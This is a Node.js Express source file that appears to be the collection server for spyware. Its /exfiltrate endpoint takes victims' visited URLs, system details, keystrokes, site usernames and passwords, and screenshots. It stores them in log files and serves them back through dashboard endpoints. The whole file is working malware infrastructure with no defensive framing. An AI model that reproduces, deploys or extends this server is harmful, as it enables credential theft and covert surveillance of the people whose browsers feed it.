import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import fs from 'fs';


const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 3000;

app.use(express.json({ limit: "50mb" }));

var links = new Array();
var system_info;
var keylogger_info;
var credentials = {};

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "dashboard.html")); // Serve the HTML file
});


app.post('/exfiltrate', (req, res) => {
    const { type, data } = req.body;
    if (!type || !data) {
        res.status(400).send('Bad Request: Missing type or data');
        return;
    }

    switch (type) {
        case 'urls':
            const url = data;
//            console.log("Received URL:", url);
            links.push({
              url: url,
              receivedAt: new Date()
            });

            const csvHeader = "receivedAt, url\n";
            const csvContent = links.map(link => `${link.receivedAt.toISOString()}, ${link.url}`).join("\n");
            const filePath = path.join(__dirname, "csv/urls/urls.csv");
            fs.writeFileSync(filePath, csvHeader + csvContent, "utf8");
            break;
        case 'os':
            console.log("Keylogger updated");
            system_info = data;

            const osFilePath = path.join(__dirname, "/csv/os.json");
            const osData = {
                receivedAt: new Date().toISOString(),
                osInfo: system_info
            };
            fs.writeFileSync(osFilePath, JSON.stringify(osData, null, 2), "utf8");
            break;

        case 'keys':
            console.log("Keylogger updated");
            keylogger_info = data;

            const logFilePath = path.join(__dirname, "/csv/keylogger/keylogger.log");
            let logContent = "";

            for (const [url, entries] of Object.entries(keylogger_info)) {
                logContent += `${url}:\n`;
                entries.forEach(entry => {
                    logContent += `[${entry.timestamp}] ${entry.text}\n`;
                });
                logContent += "\n";
            }

            fs.appendFileSync(logFilePath, logContent, "utf8");
            break;

       case 'credentials':
            console.log("credentials recorded");
            credentials = data;

            const credFilePath = path.join(__dirname, "csv/credentials/credentials.log");
            let credContent = "";

            for (const [site, creds] of Object.entries(credentials)) {
                credContent += `${site}:\n`;
                credContent += `Username: ${creds.username}\n`;
                credContent += `Password: ${creds.password}\n\n`;
            }

            fs.appendFileSync(credFilePath, credContent, "utf8");
            break;

       case 'screenshot':
            const base64Data = data.replace(/^data:image\/png;base64,/, "");
            const ss_path = path.join(__dirname, "csv/images", `screenshot_${Date.now()}.png`);

            fs.writeFile(ss_path, base64Data, "base64", (err) => {
                if (err) {
                    console.error("Error saving screenshot:", err);
                    return res.status(500).send("Failed to save screenshot");
                }
                console.log("Screenshot saved:", ss_path);

            });
            break;



//        default:
//            console.log(`Unknown type: ${type}`);
//            fs.appendFileSync('exfiltrated_data.txt', `Unknown Type: ${type}\n\n`);
//            break;
    }

    res.sendStatus(200);
});



/*

HELPERS

*/

app.get('/get-urls', (req, res) => {
    res.json(links);
});


app.get('/get-os', (req, res) => {
    if (system_info)
        res.json(system_info);
});

app.get('/get-keys', (req, res) => {
    res.json(keylogger_info);
});

app.get('/get-credentials', (req, res) => {
    res.json(credentials);
});

app.use("/images", express.static(path.join(__dirname, "csv/images")));

app.get("/get-images", (req, res) => {
    const imagesDir = path.join(__dirname, "csv/images");

    fs.readdir(imagesDir, (err, files) => {
        if (err) {
            console.error("Error reading images directory:", err);
            return res.status(500).send("Failed to load images");
        }

        // Sort images by newest first (based on timestamp in filename)
        files.sort((a, b) => b.localeCompare(a));

        // Send list of image URLs
        res.json(files.map(file => `/images/${file}`));
    });
});


app.listen(PORT, () => {
    console.log(`Server running on: http://localhost:${PORT}/`);
});
